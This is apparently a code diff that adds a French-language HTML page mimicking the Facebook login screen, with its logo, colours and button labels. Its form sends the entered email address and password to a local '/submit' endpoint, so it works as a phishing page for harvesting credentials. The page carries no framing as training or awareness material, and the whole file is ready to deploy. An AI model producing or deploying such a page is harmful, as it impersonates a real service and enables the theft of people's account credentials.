@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Connexion</title>
+<style>
+  body { margin: 0; font-family: SFProDisplay, Helvetica, Arial, sans-serif; background: #f0f2f5;
+         min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
+  .wrapper { max-width: 396px; width: 100%; }
+  .logo { text-align: center; font-size: 56px; font-weight: bold; color: #1877f2;
+          margin-bottom: 12px; letter-spacing: -2px; }
+  .card { background: white; padding: 20px; border-radius: 8px;
+          box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
+  input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px;
+          font-size: 17px; box-sizing: border-box; margin-bottom: 12px; }
+  input:focus { outline: none; border-color: #1877f2; }
+  button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none;
+           border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer;
+           margin-bottom: 16px; }
+  button:hover { background: #166fe5; }
+  .forgot { text-align: center; color: #1877f2; font-size: 14px; padding: 12px 0;
+            border-bottom: 1px solid #dadde1; cursor: pointer; }
+  .create { background: #42b72a; color: white; padding: 12px 16px; border-radius: 6px;
+            border: none; font-size: 17px; font-weight: bold; cursor: pointer;
+            display: block; margin: 20px auto 0; }
+  .footer-text { text-align: center; font-size: 14px; color: #1c1e21; margin-top: 28px; }
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="logo">facebook</div>
+  <div class="card">
+    <form method="POST" action="/submit">
+      <input type="text" name="email" placeholder="Adresse e-mail ou mobile" required>
+      <input type="password" name="password" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+      <div class="forgot">Mot de passe oublié ?</div>
+      <button type="button" class="create">Créer un nouveau compte</button>
+    </form>
+  </div>
+  <p class="footer-text"><a href="#" style="color:#1c1e21">Créer une Page</a> pour une célébrité, une marque ou une entreprise.</p>
+</div>
+</body>
+</html>
